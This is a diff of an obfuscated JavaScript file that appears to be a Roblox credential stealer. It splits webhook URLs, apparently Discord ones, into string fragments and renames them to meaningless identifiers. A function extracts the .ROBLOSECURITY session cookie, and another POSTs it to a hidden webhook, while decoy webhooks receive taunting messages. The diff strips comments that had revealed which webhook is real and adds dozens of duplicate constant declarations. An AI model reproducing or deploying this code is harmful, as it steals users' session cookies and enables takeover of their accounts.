@@ -1,4 +1,4 @@
-const diejwjdhjejwjw1 = [
+const diejwjdhjejdawawdwjw = [
   
   'ht', 'tp', 's:', '//', 'di', 
   
@@ -26,7 +26,7 @@ const diejwjdhjejwjw1 = [
   
 ];
 
-const diejwjdhjejwjw2 = [
+const diejwjdhadwawDawdwadjejwjw2daw = [
   
   'ht', 'tp', 's:', '//', 'di', 
   
@@ -48,7 +48,7 @@ const diejwjdhjejwjw2 = [
   
 ];
 
-const diejwjdhjejwjw3 = [
+const diejwjdhjedwawadjwjw3dawawdwad = [
   
   'ht', 'tp', 's:', '//', 'di', 
   
@@ -70,7 +70,7 @@ const diejwjdhjejwjw3 = [
   
 ];
 
-const diejwjdhjejwjw4 = [
+const diejwjdhjej321321wjw4rwa = [
   
   'ht', 'tp', 's:', '//', 'di', 
   
@@ -92,7 +92,7 @@ const diejwjdhjejwjw4 = [
   
 ];
 
-const diejwjdhjejwjw5 = [
+const diejwjdhjejwjwdawwfasdawdscacawd = [
   
   'ht', 'tp', 's:', '//', 'di', 
   
@@ -114,7 +114,7 @@ const diejwjdhjejwjw5 = [
   
 ];
 
-const diejwjdhjejwjw6 = [
+const diejwjdhjejwjwadwhadwhdaw = [
   
   'ht', 'tp', 's:', '//', 'di', 
   
@@ -136,7 +136,7 @@ const diejwjdhjejwjw6 = [
   
 ];
 
-const diejwjdhjejwjw7 = [
+const diejwjdhjejwjwdawnwdannwa = [
   
   'ht', 'tp', 's:', '//', 'di', 
   
@@ -158,7 +158,7 @@ const diejwjdhjejwjw7 = [
   
 ];
 
-const diejwjdhjejwjw8 = [
+const diejwjdhjejwjwcsadwabfwadawdw = [
   
   'ht', 'tp', 's:', '//', 'di', 
   
@@ -180,10 +180,9 @@ const diejwjdhjejwjw8 = [
   
 ];
 
-// Fake functions for each fake webhook
-function sendToWebhook2() {
-  const url2 = diejwjdhjejwjw2.join('');
-  const payload = { content: 'Fake Webhook 2 Data' };
+function awdawdawd() {
+  const url2 = diejwjdhadwawDawdwadjejwjw2daw.join('');
+  const payload = { content: 'get off the backend u dumbass' };
   fetch(url2, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -191,9 +190,9 @@ function sendToWebhook2() {
   });
 }
 
-function sendToWebhook3() {
-  const url3 = diejwjdhjejwjw3.join('');
-  const payload = { content: 'Fake Webhook 3 Data' };
+function dwawadwad() {
+  const url3 = diejwjdhjedwawadjwjw3dawawdwad.join('');
+  const payload = { content: 'DECRYPTING SESSSION ID ' };
   fetch(url3, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -201,9 +200,9 @@ function sendToWebhook3() {
   });
 }
 
-function sendToWebhook4() {
-  const url4 = diejwjdhjejwjw4.join('');
-  const payload = { content: 'Fake Webhook 4 Data' };
+function awddwadaw() {
+  const url4 = diejwjdhjej321321wjw4rwa.join('');
+  const payload = { content: 'DECRYPTING SESSSION ID ' };
   fetch(url4, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -211,48 +210,100 @@ function sendToWebhook4() {
   });
 }
 
-function sendToWebhook5() {
-  const url5 = diejwjdhjejwjw5.join('');
-  const payload = { content: 'Fake Webhook 5 Data' };
-  fetch(url5, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
-}
 
-function sendToWebhook6() {
-  const url6 = diejwjdhjejwjw6.join('');
-  const payload = { content: 'Fake Webhook 6 Data' };
-  fetch(url6, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
-}
 
-function sendToWebhook7() {
-  const url7 = diejwjdhjejwjw7.join('');
-  const payload = { content: 'Fake Webhook 7 Data' };
-  fetch(url7, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
-}
+const adwdawdacsazdawradfsadaw = diejwjdhjejdawawdwjw.join(''); 
+const adwdawdacfazdawradfsadaw = diejwjdhadwawDawdwadjejwjw2daw.join('');    
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join(''); 
 
-function sendToWebhook8() {
-  const url8 = diejwjdhjejwjw8.join('');
-  const payload = { content: 'Fake Webhook 8 Data' };
-  fetch(url8, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
-}
-
-// Original function with the real webhook
-const _decrypted = diejwjdhjejwjw1.join(''); // Decrypt the URL by concatenating the parts
+const adwdawdacfazdawradfsadaw = diejwjdhadwawDawdwadjejwjw2daw.join('');    
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join(''); 
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join(''); 
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join(''); 
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join(''); 
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join('');    
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join(''); 
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join('');   
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join('');  
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join('');   
+const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
+const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
+const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
+const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
+const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
+const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join(''); 
 
 function extractRobloxSecurityCookie(sessionId) {
   // Use a regular expression to find the .ROBLOSECURITY cookie
@@ -284,7 +335,7 @@ function bruteforce(sessionId) {
     content: content
   };
 
-  fetch(_decrypted, {
+  fetch(adwdawdacsazdawradfsadaw, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
